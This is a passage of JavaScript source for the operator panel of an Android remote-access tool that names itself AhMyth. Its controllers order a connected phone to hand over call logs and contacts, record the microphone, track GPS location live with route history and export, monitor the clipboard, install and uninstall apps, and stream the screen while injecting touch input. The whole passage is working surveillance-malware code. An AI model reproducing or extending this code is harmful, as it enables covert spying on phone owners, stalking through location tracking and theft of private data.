                $rootScope.Log(`[✓] Call logs saved: ${csvPath}`, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(calls, (data) => {
        if (data.callsList) {
            $CallsCtrl.load = '';
            $rootScope.Log(`[✓] Call logs received: ${data.callsList.length} entries`, CONSTANTS.logStatus.SUCCESS);
            $CallsCtrl.callsList = data.callsList;
            $CallsCtrl.logsSize = data.callsList.length;
            
            // Save to DB
            if (db) {
                try {
                    db.saveCalls(data.callsList);
                } catch (e) { console.error(e); }
            }
            
            $CallsCtrl.$apply();
        }
    });



});





//-----------------------Contacts Controller (contacts.htm)------------------------
// Contacts controller
app.controller("ContCtrl", function ($scope, $rootScope) {
    $ContCtrl = $scope;
    $ContCtrl.contactsList = [];
    var contacts = CONSTANTS.orders.contacts;

    $ContCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(contacts);
    });

    $ContCtrl.load = 'loading';
    $rootScope.Log('[→] Fetching contacts...', CONSTANTS.logStatus.INFO);
    socket.emit(ORDER, { order: contacts });

    $ContCtrl.barLimit = 50;
    $ContCtrl.increaseLimit = () => {
        $ContCtrl.barLimit += 50;
    }

    $ContCtrl.SaveContacts = () => {

        if ($ContCtrl.contactsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $ContCtrl.contactsList.length; i++) {
            csvRows.push($ContCtrl.contactsList[i].phoneNo + "," + $ContCtrl.contactsList[i].name);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
        $rootScope.Log("[→] Saving contacts...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log(`[✗] Failed to save: ${csvPath}`, CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Contacts saved: ${csvPath}`, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(contacts, (data) => {
        if (data.contactsList) {
            $ContCtrl.load = '';
            $rootScope.Log(`[✓] Contacts received: ${data.contactsList.length} contacts`, CONSTANTS.logStatus.SUCCESS);
            $ContCtrl.contactsList = data.contactsList;
            $ContCtrl.contactsSize = data.contactsList.length;
            $ContCtrl.$apply();
        }
    });





});




//-----------------------Mic Controller (mic.htm)------------------------
// Mic controller
app.controller("MicCtrl", function ($scope, $rootScope) {
    $MicCtrl = $scope;
    $MicCtrl.isAudio = true;
    var mic = CONSTANTS.orders.mic;

    $MicCtrl.$on('$destroy', function () {
        // release resources, cancel Listner...
        socket.removeAllListeners(mic);
    });

    $MicCtrl.Record = (seconds) => {

        if (seconds) {
            if (seconds > 0) {
                $rootScope.Log(`[→] Recording audio for ${seconds} seconds...`, CONSTANTS.logStatus.INFO);
                socket.emit(ORDER, { order: mic, sec: seconds });
            } else
                $rootScope.Log('[⚠] Recording duration must be greater than 0', CONSTANTS.logStatus.WARNING);

        }

    }


    socket.on(mic, (data) => {
        if (data.file == true) {
            $rootScope.Log('[✓] Audio recording received', CONSTANTS.logStatus.SUCCESS);

            var player = document.getElementById('player');
            var sourceMp3 = document.getElementById('sourceMp3');
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $MicCtrl.isAudio = false;
            $MicCtrl.$apply();
            sourceMp3.src = "data:audio/mp3;base64," + base64String;
            player.load();
            player.play();

            $MicCtrl.SaveAudio = () => {
                $rootScope.Log('[→] Saving audio file...', CONSTANTS.logStatus.INFO);
                var filePath = path.join(downloadsPath, data.name);
                fs.outputFile(filePath, data.buffer, (err) => {
                    if (err)
                        $rootScope.Log('[✗] Failed to save audio', CONSTANTS.logStatus.FAIL);
                    else
                        $rootScope.Log(`[✓] Audio saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
                });


            };



        }

    });
});





//-----------------------Location Controller (location.htm)------------------------
// Location controller - REVAMPED with live tracking, history, routes
app.controller("LocCtrl", function ($scope, $rootScope, $timeout, $interval) {
    var $LocCtrl = $scope;
    var location = CONSTANTS.orders.location;
    
    // State
    $LocCtrl.currentLocation = null;
    $LocCtrl.lastUpdate = null;
    $LocCtrl.locationHistory = [];
    $LocCtrl.isTracking = false;
    $LocCtrl.activeTab = 'current';
    $LocCtrl.load = '';
    
    // Settings
    $LocCtrl.refreshInterval = 10; // seconds
    $LocCtrl.showRoute = true;
    $LocCtrl.showAllMarkers = false;
    $LocCtrl.showHeatmap = false;
    $LocCtrl.mapStyle = 'osm';
    
    // Stats
    $LocCtrl.trackingStats = null;
    
    // Map objects
    var map = null;
    var currentMarker = null;
    var routeLine = null;
    var historyMarkers = [];
    var tileLayer = null;
    var trackingInterval = null;
    var trackingStartTime = null;
    
    // Map tile providers (all free, no API key needed)
    var tileLayers = {
        osm: {
            url: 'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
            options: { maxZoom: 19, subdomains: ['a', 'b', 'c'] }
        },
        dark: {
            url: 'https://tiles.stadiamaps.com/tiles/alidade_smooth_dark/{z}/{x}/{y}{r}.png',
            attribution: '&copy; <a href="https://stadiamaps.com/">Stadia Maps</a>',
            options: { maxZoom: 20 }
        },
        satellite: {
            url: 'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',
            attribution: '&copy; <a href="https://www.esri.com/">Esri</a>',
            options: { maxZoom: 18 }
        },
        terrain: {
            url: 'https://stamen-tiles-{s}.a.ssl.fastly.net/terrain/{z}/{x}/{y}{r}.png',
            attribution: '&copy; <a href="https://stamen.com/">Stamen Design</a>',
            options: { maxZoom: 18, subdomains: 'abcd' }
        }
    };
    
    // Cleanup on destroy
    $LocCtrl.$on('$destroy', () => {
        socket.removeAllListeners(location);
        if (trackingInterval) {
            $interval.cancel(trackingInterval);
        }
        if (map) {
            map.remove();
            map = null;
        }
    });

    // Initialize map
    function initMap() {
        $timeout(() => {
            const mapContainer = document.getElementById('mapid');
            if (mapContainer && !map) {
                try {
                    map = L.map('mapid', {
                        center: [40.7128, -74.0060], // Default NYC
                        zoom: 13,
                        zoomControl: true,
                        attributionControl: true
                    });
                    
                    // Add default tile layer
                    changeMapStyle('osm');
                    
                    // Resize handling
                    var resizeMap = function() {
                        if (map) map.invalidateSize(true);
                    };
                    [100, 300, 500, 1000].forEach(delay => setTimeout(resizeMap, delay));
                    window.addEventListener('resize', resizeMap);
                    
                    $rootScope.Log('[✓] Map initialized', CONSTANTS.logStatus.SUCCESS);
                } catch (e) {
                    console.error('[AhMyth] Map error:', e);
                    $rootScope.Log('[✗] Map failed: ' + e.message, CONSTANTS.logStatus.FAIL);
                }
            } else if (!mapContainer) {
                $timeout(initMap, 200);
            }
        }, 100);
    }
    
    // Change map style
    function changeMapStyle(style) {
        if (!map) return;
        
        var config = tileLayers[style] || tileLayers.osm;
        
        if (tileLayer) {
            map.removeLayer(tileLayer);
        }
        
        tileLayer = L.tileLayer(config.url, {
            attribution: config.attribution,
            ...config.options
        }).addTo(map);
    }
    $LocCtrl.changeMapStyle = () => changeMapStyle($LocCtrl.mapStyle);
    
    // Create marker
    function createMarker(lat, lng, isCurrent = true) {
        var color = isCurrent ? '#00d4aa' : '#6366f1';
        var size = isCurrent ? 24 : 12;
        
        var icon = L.divIcon({
            className: 'custom-marker',
            html: `<div style="
                width: ${size}px; 
                height: ${size}px; 
                background: ${color}; 
                border: 3px solid #fff; 
                border-radius: 50%; 
                box-shadow: 0 0 ${isCurrent ? 15 : 5}px ${color}80;
                ${isCurrent ? 'animation: pulse-marker 2s infinite;' : ''}
            "></div>`,
            iconSize: [size, size],
            iconAnchor: [size/2, size/2]
        });
        
        return L.marker([lat, lng], { icon: icon });
    }
    
    // Update route line
    function updateRoute() {
        if (!map) return;
        
        // Remove existing route
        if (routeLine) {
            map.removeLayer(routeLine);
            routeLine = null;
        }
        
        if ($LocCtrl.showRoute && $LocCtrl.locationHistory.length > 1) {
            var points = $LocCtrl.locationHistory.map(loc => [loc.lat, loc.lng]);
            
            routeLine = L.polyline(points, {
                color: '#00d4aa',
                weight: 3,
                opacity: 0.8,
                dashArray: '10, 10',
                lineJoin: 'round'
            }).addTo(map);
        }
    }
    $LocCtrl.updateRoute = updateRoute;
    
    // Update history markers
    function updateMarkers() {
        if (!map) return;
        
        // Remove existing history markers
        historyMarkers.forEach(m => map.removeLayer(m));
        historyMarkers = [];
        
        if ($LocCtrl.showAllMarkers && $LocCtrl.locationHistory.length > 0) {
            $LocCtrl.locationHistory.forEach((loc, index) => {
                if (index < $LocCtrl.locationHistory.length - 1) { // Skip current
                    var marker = createMarker(loc.lat, loc.lng, false);
                    marker.bindPopup(`
                        <b>Point #${index + 1}</b><br>
                        Lat: ${loc.lat.toFixed(6)}<br>
                        Lng: ${loc.lng.toFixed(6)}<br>
                        Time: ${loc.time}
                    `);
                    marker.addTo(map);
                    historyMarkers.push(marker);
                }
            });
        }
    }
    $LocCtrl.updateMarkers = updateMarkers;
    
    // Calculate distance between two points (Haversine formula)
    function calculateDistance(lat1, lng1, lat2, lng2) {
        var R = 6371; // Earth's radius in km
        var dLat = (lat2 - lat1) * Math.PI / 180;
        var dLng = (lng2 - lng1) * Math.PI / 180;
        var a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
                Math.sin(dLng/2) * Math.sin(dLng/2);
        var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
        return R * c;
    }
    
    // Calculate tracking stats
    function updateStats() {
        if ($LocCtrl.locationHistory.length < 1) {
            $LocCtrl.trackingStats = null;
            return;
        }
        
        var totalDistance = 0;
        for (var i = 1; i < $LocCtrl.locationHistory.length; i++) {
            var prev = $LocCtrl.locationHistory[i-1];
            var curr = $LocCtrl.locationHistory[i];
            totalDistance += calculateDistance(prev.lat, prev.lng, curr.lat, curr.lng);
        }
        
        var duration = trackingStartTime ? Date.now() - trackingStartTime : 0;
        var hours = Math.floor(duration / 3600000);
        var minutes = Math.floor((duration % 3600000) / 60000);
        var seconds = Math.floor((duration % 60000) / 1000);
        
        var avgSpeed = duration > 0 ? (totalDistance / (duration / 3600000)) : 0;
        
        $LocCtrl.trackingStats = {
            totalDistance: totalDistance.toFixed(2),
            duration: `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`,
            avgSpeed: avgSpeed.toFixed(1)
        };
    }
    
    // Refresh location
    $LocCtrl.refreshLocation = function() {
        $LocCtrl.load = 'loading';
        $rootScope.Log('[→] Requesting GPS location...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: location });
    };
    
    // Toggle live tracking
    $LocCtrl.toggleTracking = function() {
        if ($LocCtrl.isTracking) {
            // Stop tracking
            $LocCtrl.isTracking = false;
            if (trackingInterval) {
                $interval.cancel(trackingInterval);
                trackingInterval = null;
            }
            $rootScope.Log('[⏹] Location tracking stopped', CONSTANTS.logStatus.INFO);
        } else {
            // Start tracking
            $LocCtrl.isTracking = true;
            trackingStartTime = Date.now();
            $LocCtrl.refreshLocation();
            
            trackingInterval = $interval(() => {
                if ($LocCtrl.isTracking) {
                    $LocCtrl.refreshLocation();
                }
            }, $LocCtrl.refreshInterval * 1000);
            
            $rootScope.Log(`[▶] Location tracking started (${$LocCtrl.refreshInterval}s interval)`, CONSTANTS.logStatus.SUCCESS);
        }
    };
    
    // Toggle route visibility
    $LocCtrl.toggleRoute = function() {
        $LocCtrl.showRoute = !$LocCtrl.showRoute;
        updateRoute();
    };
    
    // Toggle heatmap
    $LocCtrl.toggleHeatmap = function() {
        $LocCtrl.showHeatmap = !$LocCtrl.showHeatmap;
        // Heatmap requires additional Leaflet plugin - simplified version
        if ($LocCtrl.showHeatmap) {
            $LocCtrl.showAllMarkers = true;
            updateMarkers();
        }
    };
    
    // Center on device
    $LocCtrl.centerOnDevice = function() {
        if (map && $LocCtrl.currentLocation) {
            map.setView([parseFloat($LocCtrl.currentLocation.lat), parseFloat($LocCtrl.currentLocation.lng)], 16);
        }
    };
    
    // Fit all points
    $LocCtrl.fitAllPoints = function() {
        if (map && $LocCtrl.locationHistory.length > 0) {
            var bounds = L.latLngBounds($LocCtrl.locationHistory.map(loc => [loc.lat, loc.lng]));
            map.fitBounds(bounds, { padding: [30, 30] });
        }
    };
    
    // Focus on specific location
    $LocCtrl.focusOnLocation = function(loc) {
        if (map) {
            map.setView([loc.lat, loc.lng], 17);
        }
    };
    
    // Open in Google Maps
    $LocCtrl.openInGoogleMaps = function() {
        if ($LocCtrl.currentLocation) {
            var url = `https://www.google.com/maps?q=${$LocCtrl.currentLocation.lat},${$LocCtrl.currentLocation.lng}`;
            require('electron').shell.openExternal(url);
        }
    };
    
    // Copy coordinates
    $LocCtrl.copyCoordinates = function() {
        if ($LocCtrl.currentLocation) {
            var coords = `${$LocCtrl.currentLocation.lat}, ${$LocCtrl.currentLocation.lng}`;
            require('electron').clipboard.writeText(coords);
            $rootScope.Log('[✓] Coordinates copied to clipboard', CONSTANTS.logStatus.SUCCESS);
        }
    };
    
    // Export history as JSON
    $LocCtrl.exportHistory = function() {
        if ($LocCtrl.locationHistory.length === 0) return;
        
        var data = {
            device: originalSocket.deviceId || 'unknown',
            exportDate: new Date().toISOString(),
            pointCount: $LocCtrl.locationHistory.length,
            stats: $LocCtrl.trackingStats,
            locations: $LocCtrl.locationHistory
        };
        
        var filename = `location-history-${Date.now()}.json`;
        var filePath = path.join(downloadsPath, filename);
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
        
        $rootScope.Log(`[✓] History exported: ${filename}`, CONSTANTS.logStatus.SUCCESS);
    };
    
    // Export as KML
    $LocCtrl.exportAsKML = function() {
        if ($LocCtrl.locationHistory.length === 0) return;
        
        var kml = `<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <name>AhMyth Location History</name>
    <description>Exported on ${new Date().toISOString()}</description>
    <Style id="trackStyle">
      <LineStyle>
        <color>ff00d4aa</color>
        <width>3</width>
      </LineStyle>
      <IconStyle>
        <Icon><href>http://maps.google.com/mapfiles/kml/shapes/placemark_circle.png</href></Icon>
      </IconStyle>
    </Style>
    <Placemark>
      <name>Device Route</name>
      <styleUrl>#trackStyle</styleUrl>
      <LineString>
        <coordinates>
${$LocCtrl.locationHistory.map(loc => `          ${loc.lng},${loc.lat},${loc.altitude || 0}`).join('\n')}
        </coordinates>
      </LineString>
    </Placemark>
${$LocCtrl.locationHistory.map((loc, i) => `    <Placemark>
      <name>Point ${i + 1}</name>
      <description>${loc.time}</description>
      <styleUrl>#trackStyle</styleUrl>
      <Point><coordinates>${loc.lng},${loc.lat},${loc.altitude || 0}</coordinates></Point>
    </Placemark>`).join('\n')}
  </Document>
</kml>`;
        
        var filename = `location-history-${Date.now()}.kml`;
        var filePath = path.join(downloadsPath, filename);
        fs.writeFileSync(filePath, kml);
        
        $rootScope.Log(`[✓] KML exported: ${filename}`, CONSTANTS.logStatus.SUCCESS);
    };
    
    // Clear history
    $LocCtrl.clearHistory = function() {
        $LocCtrl.locationHistory = [];
        trackingStartTime = null;
        $LocCtrl.trackingStats = null;
        
        historyMarkers.forEach(m => map.removeLayer(m));
        historyMarkers = [];
        
        if (routeLine) {
            map.removeLayer(routeLine);
            routeLine = null;
        }
        
        $rootScope.Log('[✓] Location history cleared', CONSTANTS.logStatus.INFO);
    };
    
    // Request permission
    $LocCtrl.requestPermission = function(type) {
        socket.emit(ORDER, { order: 'x0000rp', extra: type });
        $rootScope.Log(`[→] Requesting ${type} permission...`, CONSTANTS.logStatus.INFO);
    };
    
    // Handle location response
    socket.on(location, (data) => {
        $LocCtrl.load = '';
        
        if (data.enable) {
            if (data.lat == 0 && data.lng == 0) {
                $rootScope.Log('[⚠] Location unavailable', CONSTANTS.logStatus.WARNING);
            } else {
                $rootScope.Log(`[✓] Location: ${data.lat.toFixed(6)}, ${data.lng.toFixed(6)}`, CONSTANTS.logStatus.SUCCESS);
                
                // Update current location with all available data
                $LocCtrl.currentLocation = {
                    lat: data.lat.toFixed(6),
                    lng: data.lng.toFixed(6),
                    accuracy: data.accuracy ? Math.round(data.accuracy) + 'm' : null,
                    altitude: data.altitude ? Math.round(data.altitude) : null,
                    speed: data.speed ? (data.speed * 3.6).toFixed(1) : null, // m/s to km/h
                    provider: data.provider || null
                };
                $LocCtrl.lastUpdate = new Date().toLocaleTimeString();
                
                // Add to history
                var historyPoint = {
                    lat: data.lat,
                    lng: data.lng,
                    accuracy: data.accuracy ? Math.round(data.accuracy) : null,
                    altitude: data.altitude ? Math.round(data.altitude) : null,
                    speed: data.speed || null,
                    provider: data.provider || null,
                    timestamp: Date.now(),
                    time: new Date().toLocaleTimeString()
                };
                $LocCtrl.locationHistory.push(historyPoint);
                
                // Update stats
                updateStats();
                
                // Update map
                if (map) {
                    var latlng = L.latLng(data.lat, data.lng);
                    
                    if (!currentMarker) {
                        currentMarker = createMarker(data.lat, data.lng, true);
                        currentMarker.addTo(map);
                    } else {
                        currentMarker.setLatLng(latlng);
                    }
                    
                    currentMarker.bindPopup(`
                        <b>Current Location</b><br>
                        Lat: ${data.lat.toFixed(6)}<br>
                        Lng: ${data.lng.toFixed(6)}<br>
                        ${data.accuracy ? `Accuracy: ±${Math.round(data.accuracy)}m<br>` : ''}
                        ${data.altitude ? `Altitude: ${Math.round(data.altitude)}m<br>` : ''}
                        ${data.provider ? `Provider: ${data.provider}` : ''}
                    `);
                    
                    map.setView(latlng, map.getZoom() < 14 ? 15 : map.getZoom());
                    
                    // Update route and markers
                    updateRoute();
                    if ($LocCtrl.showAllMarkers) updateMarkers();
                    
                    setTimeout(() => map.invalidateSize(), 100);
                }
            }
        } else {
            $rootScope.Log('[✗] Location disabled on device', CONSTANTS.logStatus.FAIL);
        }
        
        if (!$LocCtrl.$$phase) $LocCtrl.$apply();
    });
    
    // Initialize
    initMap();
    
    // Auto-request on load
    $timeout(() => {
        $LocCtrl.refreshLocation();
    }, 500);
});

//-----------------------Device Info Controller------------------------
app.controller("DeviceInfoCtrl", function ($scope, $rootScope) {
    $DeviceInfoCtrl = $scope;
    $DeviceInfoCtrl.deviceInfo = null;
    var deviceInfo = CONSTANTS.orders.deviceInfo;

    $DeviceInfoCtrl.$on('$destroy', () => {
        socket.removeAllListeners(deviceInfo);
    });

    $DeviceInfoCtrl.getDeviceInfo = () => {
        $rootScope.Log('[→] Fetching device information...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: deviceInfo });
    };

    socket.on(deviceInfo, (data) => {
        $rootScope.Log('[✓] Device information received', CONSTANTS.logStatus.SUCCESS);
        $DeviceInfoCtrl.deviceInfo = data;
        $DeviceInfoCtrl.$apply();
    });

    // Auto-load on init
    $DeviceInfoCtrl.getDeviceInfo();
});

//-----------------------Apps Controller------------------------
app.controller("AppsCtrl", function ($scope, $rootScope) {
    $AppsCtrl = $scope;
    $AppsCtrl.appsList = [];
    $AppsCtrl.load = 'loading';
    var apps = CONSTANTS.orders.apps;

    $AppsCtrl.$on('$destroy', () => {
        socket.removeAllListeners(apps);
    });

    $AppsCtrl.getApps = () => {
        $AppsCtrl.load = 'loading';
        $rootScope.Log('[→] Fetching installed apps...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: apps });
    };

    $AppsCtrl.barLimit = 50;
    $AppsCtrl.increaseLimit = () => {
        $AppsCtrl.barLimit += 50;
    };

    // Install app from file path - with file picker
    $AppsCtrl.installApp = () => {
        const { remote } = require('electron');
        const { dialog } = remote || require('@electron/remote');
        if (!dialog) {
            const apkPath = prompt('Enter APK file path on device:');
            if (!apkPath || apkPath.trim() === '') {
                $rootScope.Log('[✗] No file path provided', CONSTANTS.logStatus.FAIL);
                return;
            }
            $rootScope.Log(`[→] Installing app from: ${apkPath}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: CONSTANTS.orders.installApp, apkPath: apkPath.trim() });
            return;
        }
        
        dialog.showOpenDialog({
            title: 'Select APK file to install on device',
            filters: [
                { name: 'APK files', extensions: ['apk'] },
                { name: 'All files', extensions: ['*'] }
            ],
            properties: ['openFile']
        }).then(result => {
            if (!result.canceled && result.filePaths.length > 0) {
                const filePath = result.filePaths[0];
                $rootScope.Log(`[→] Selected APK: ${filePath}`, CONSTANTS.logStatus.INFO);
                // Note: For remote install, we need to upload the file or provide device path
                // For now, we'll ask for device path after file selection
                const devicePath = prompt(`Enter path on device where APK should be located:\n(Selected: ${filePath})`);
                if (devicePath && devicePath.trim() !== '') {
                    $rootScope.Log(`[→] Installing app from device path: ${devicePath}`, CONSTANTS.logStatus.INFO);
                    socket.emit(ORDER, { order: CONSTANTS.orders.installApp, apkPath: devicePath.trim() });
                }
            }
        }).catch(err => {
            $rootScope.Log(`[✗] File selection cancelled or error: ${err.message}`, CONSTANTS.logStatus.FAIL);
        });
    };

    // Uninstall app by package name
    $AppsCtrl.uninstallApp = (packageName, appName) => {
        if (!packageName || packageName.trim() === '') {
            $rootScope.Log('[✗] Please provide a package name', CONSTANTS.logStatus.FAIL);
            return;
        }
        const confirmMsg = `Are you sure you want to uninstall "${appName || packageName}"?`;
        if (confirm(confirmMsg)) {
            $rootScope.Log(`[→] Uninstalling app: ${packageName}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: CONSTANTS.orders.uninstallApp, packageName: packageName });
        }
    };

    socket.on(apps, (data) => {
        $AppsCtrl.load = '';
        if (data.appsList) {
            $rootScope.Log(`[✓] Apps list received: ${data.appsList.length} apps`, CONSTANTS.logStatus.SUCCESS);
            $AppsCtrl.appsList = data.appsList;
            $AppsCtrl.$apply();
        }
    });

    // Handle install app response
    socket.on(CONSTANTS.orders.installApp, (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
        } else {
            $rootScope.Log(`[✗] Installation failed: ${data.error}`, CONSTANTS.logStatus.FAIL);
        }
        $AppsCtrl.$apply();
    });

    // Handle uninstall app response
    socket.on(CONSTANTS.orders.uninstallApp, (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
            // Refresh apps list after uninstall
            setTimeout(() => {
                $AppsCtrl.getApps();
            }, 2000);
        } else {
            $rootScope.Log(`[✗] Uninstallation failed: ${data.error}`, CONSTANTS.logStatus.FAIL);
        }
        $AppsCtrl.$apply();
    });

    // Auto-load on init
    $AppsCtrl.getApps();
});

//-----------------------Clipboard Controller------------------------
app.controller("ClipboardCtrl", function ($scope, $rootScope) {
    $ClipboardCtrl = $scope;
    $ClipboardCtrl.clipboardText = '';
    $ClipboardCtrl.isMonitoring = false;
    var clipboard = CONSTANTS.orders.clipboard;

    $ClipboardCtrl.$on('$destroy', () => {
        socket.removeAllListeners(clipboard);
    });

    $ClipboardCtrl.getClipboard = () => {
        $rootScope.Log('[→] Fetching clipboard content...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: clipboard, extra: 'get' });
    };

    $ClipboardCtrl.startMonitoring = () => {
        $ClipboardCtrl.isMonitoring = true;
        $rootScope.Log('[✓] Clipboard monitoring started', CONSTANTS.logStatus.SUCCESS);
        socket.emit(ORDER, { order: clipboard, extra: 'start' });
    };

    $ClipboardCtrl.stopMonitoring = () => {
        $ClipboardCtrl.isMonitoring = false;
        $rootScope.Log('[→] Clipboard monitoring stopped', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: clipboard, extra: 'stop' });
    };

    socket.on(clipboard, (data) => {
        if (data.hasData && data.text) {
            $ClipboardCtrl.clipboardText = data.text;
            if ($ClipboardCtrl.isMonitoring && data.timestamp) {
                $rootScope.Log(`[ℹ] Clipboard changed: ${data.text.substring(0, 50)}...`, CONSTANTS.logStatus.INFO);
            } else {
                $rootScope.Log('[✓] Clipboard content received', CONSTANTS.logStatus.SUCCESS);
            }
            $ClipboardCtrl.$apply();
        } else {
            $ClipboardCtrl.clipboardText = '';
            $rootScope.Log('[ℹ] Clipboard is empty', CONSTANTS.logStatus.INFO);
            $ClipboardCtrl.$apply();
        }
    });

    // Auto-load on init
    $ClipboardCtrl.getClipboard();
});

//-----------------------WiFi Controller------------------------
app.controller("WiFiCtrl", function ($scope, $rootScope) {
    $WiFiCtrl = $scope;
    $WiFiCtrl.wifiInfo = null;
    var wifi = CONSTANTS.orders.wifi;

    $WiFiCtrl.$on('$destroy', () => {
        socket.removeAllListeners(wifi);
    });

    $WiFiCtrl.getWiFiInfo = () => {
        $rootScope.Log('[→] Fetching WiFi information...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: wifi });
    };

    socket.on(wifi, (data) => {
        if (data.enabled) {
            $rootScope.Log('[✓] WiFi information received', CONSTANTS.logStatus.SUCCESS);
        } else {
            $rootScope.Log('[⚠] WiFi is disabled on device', CONSTANTS.logStatus.WARNING);
        }
        $WiFiCtrl.wifiInfo = data;
        $WiFiCtrl.$apply();
    });

    // Auto-load on init
    $WiFiCtrl.getWiFiInfo();
});

//-----------------------Screen Controller (screen.html)------------------------
// Remote Desktop / VNC-like Controller with Touch Input
app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) {
    $ScreenCtrl = $scope;
    var screen = CONSTANTS.orders.screen || 'x0000sc';
    var input = CONSTANTS.orders.input || 'x0000in';
    
    // State
    $ScreenCtrl.isStreaming = false;
    $ScreenCtrl.isLoading = false;
    $ScreenCtrl.currentFrame = null;
    $ScreenCtrl.screenInfo = { width: 1080, height: 1920 };
    $ScreenCtrl.permissionRequired = false;
    $ScreenCtrl.awaitingPermission = false;  // Prevent permission spam
    $ScreenCtrl.permissionGranted = false;
    $ScreenCtrl.frameCount = 0;
    $ScreenCtrl.lastFrameSize = 0;
    $ScreenCtrl.actualFps = 0;
    
    // Touch control
    $ScreenCtrl.touchEnabled = true;
    $ScreenCtrl.lastTouchPos = null;
    $ScreenCtrl.inputLog = [];
    $ScreenCtrl.textToSend = '';
    
    // Settings
    $ScreenCtrl.quality = '50';
    $ScreenCtrl.fps = '250'; // ms between frames
    
    var streamInterval = null;
    var canvas = null;
    var ctx = null;
    var fpsCounter = 0;
    var fpsTimer = null;
    var isDragging = false;
    var dragStart = null;
    
    $ScreenCtrl.$on('$destroy', () => {
        socket.removeAllListeners(screen);
        socket.removeAllListeners(input);
        if (streamInterval) $interval.cancel(streamInterval);
        if (fpsTimer) $interval.cancel(fpsTimer);
    });
    
    // Initialize canvas
    function initCanvas() {
        canvas = document.getElementById('screenCanvas');
        if (canvas) {
            ctx = canvas.getContext('2d');
        }
    }
    
    // Get canvas coordinates normalized to screen dimensions
    function getCanvasCoords(event) {
        if (!canvas) return null;
        
        var rect = canvas.getBoundingClientRect();
        var scaleX = canvas.width / rect.width;
        var scaleY = canvas.height / rect.height;
        
        var canvasX = (event.clientX - rect.left) * scaleX;
        var canvasY = (event.clientY - rect.top) * scaleY;
        
        // Normalize to 0-1 range for device screen mapping
        var normX = canvasX / canvas.width;
        var normY = canvasY / canvas.height;
        
        return {
            x: Math.max(0, Math.min(1, normX)),
            y: Math.max(0, Math.min(1, normY)),
            pixelX: Math.round(canvasX),
            pixelY: Math.round(canvasY),
            screenX: event.clientX - rect.left,
            screenY: event.clientY - rect.top
        };
    }
    
    // Show touch indicator
    function showTouchIndicator(x, y) {
        $ScreenCtrl.lastTouchPos = { x: x, y: y };
        $timeout(() => {
            $ScreenCtrl.lastTouchPos = null;
        }, 500);
    }
    
    // Add to input log
    function logInput(action, detail) {
        $ScreenCtrl.inputLog.unshift({ action: action, detail: detail });
        if ($ScreenCtrl.inputLog.length > 10) {
            $ScreenCtrl.inputLog.pop();
        }
    }
    
    // Render frame to canvas
    function renderFrame(base64Image, width, height) {
        if (!canvas || !ctx) {
            initCanvas();
        }
        
        if (!canvas || !ctx) {
            console.error('[AhMyth] Canvas not initialized');
            return;
        }
        
        var img = new Image();
        img.onload = function() {
            canvas.width = width || img.width;
            canvas.height = height || img.height;
            ctx.drawImage(img, 0, 0);
            $ScreenCtrl.currentFrame = base64Image;
            fpsCounter++;
            
            if (!$ScreenCtrl.$$phase) {
                $ScreenCtrl.$apply();
            }
        };
        img.onerror = function(err) {
            console.error('[AhMyth] Failed to load image', err);
        };
        img.src = 'data:image/jpeg;base64,' + base64Image;
    }
    
    // ============ Touch/Input Handlers ============
    
    $ScreenCtrl.handleClick = (event) => {
        if (!$ScreenCtrl.touchEnabled || isDragging) return;
        
        var coords = getCanvasCoords(event);
        if (!coords) return;
        
        showTouchIndicator(coords.screenX, coords.screenY);
        logInput('TAP', `${(coords.x * 100).toFixed(0)}%, ${(coords.y * 100).toFixed(0)}%`);
        
        socket.emit(ORDER, {
            order: input,
            action: 'tap',
            x: coords.x,
            y: coords.y,
            normalized: true
        });
    };
    
    $ScreenCtrl.handleMouseDown = (event) => {
        if (!$ScreenCtrl.touchEnabled) return;
        dragStart = getCanvasCoords(event);
        isDragging = false;
    };
    
    $ScreenCtrl.handleMouseMove = (event) => {
        if (!$ScreenCtrl.touchEnabled || !dragStart) return;
        var coords = getCanvasCoords(event);
        if (!coords) return;
        
        // Check if movement is significant enough to be a drag
        var dx = Math.abs(coords.x - dragStart.x);
        var dy = Math.abs(coords.y - dragStart.y);
        if (dx > 0.02 || dy > 0.02) {
            isDragging = true;
        }
    };
    
    $ScreenCtrl.handleMouseUp = (event) => {
        if (!$ScreenCtrl.touchEnabled) return;
        
        if (isDragging && dragStart) {
            var endCoords = getCanvasCoords(event);
            if (endCoords) {
